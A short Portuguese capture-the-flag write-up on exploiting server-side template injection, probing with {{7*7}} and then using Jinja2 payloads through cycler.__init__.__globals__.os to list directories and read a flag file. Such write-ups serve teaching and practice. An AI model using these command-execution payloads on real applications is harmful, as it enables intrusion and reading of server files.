
Ao realizar o teste {{7*7}}, printou o resultado 49 na tela, logo sabemos que é vulnerável a SSTI.

<img width="749" height="504" alt="image" src="https://github.com/user-attachments/assets/91f3b592-d158-4183-8753-b44f996be8c3" />

foi realizado o seguinte comando 

`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`

Ele é um comando caso o cycle esteja bloqueado.

<img width="565" height="430" alt="image" src="https://github.com/user-attachments/assets/17b813e9-54e2-445a-a280-3d6b520e96f9" />

O comando mostrou uma possível pasta chamada secrets777666.
Portanto foi utilizado o seguinte comando:

`{{ cycler.__init__.__globals__.os.listdir('secrets777666') }}`

O comando mostrou que exite um arquivo chamdo flag.txt


<img width="582" height="405" alt="image" src="https://github.com/user-attachments/assets/3c507fca-ea72-4b2b-b704-26628fc89953" />

Portanto foi usado o seguinte comando para ler o arquivo :

`{{ cycler.__init__.__globals__.os.popen('cat secrets777666/flag.txt').read() }}`

<img width="556" height="407" alt="image" src="https://github.com/user-attachments/assets/2680325b-3a82-4ea4-ab0d-9c03a2f9424a" />


 

